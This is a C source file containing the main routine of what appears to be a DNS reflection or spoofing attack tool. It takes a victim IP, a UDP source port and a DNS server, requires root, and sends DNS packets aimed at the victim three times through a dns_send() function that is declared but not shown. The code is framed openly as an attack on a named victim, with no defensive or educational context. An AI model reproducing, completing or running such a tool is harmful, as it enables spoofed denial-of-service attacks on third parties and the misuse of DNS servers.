#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/time.h>
#include <time.h>

int dns_send(char *victim_ip,int udp_src_port,char *dns_ip,int dns_port);
int main(int argc, char **argv){	
	// Initial uid check and argument count check
	if(argc != 4){
		printf("- Invalid parameters!!!\n");
		printf("- Usage %s <Victim IP> <UDP Source Port> <DNS Server IP>\n", argv[0]);
		exit(-1);
	}
	if(getuid() != 0){
		printf("[x] You must be running as root!\n");
		exit(-1);
	}
	char *victim_ip = argv[1],*dns_server = argv[3];
	int udp_src_p = atoi(argv[2]);
	int i;
	for(i = 1;i <= 3;i++){
		if(dns_send(victim_ip,udp_src_p,dns_server, 53) == -1){
			printf("[x] Get error in dns_send()\n");
			exit(-1);
		}
		else{
			printf("[*] Sucessfully launch dns_send() by %s for %d times\n",dns_server,i);
			sleep(2);
		}
	}
	return 0;
}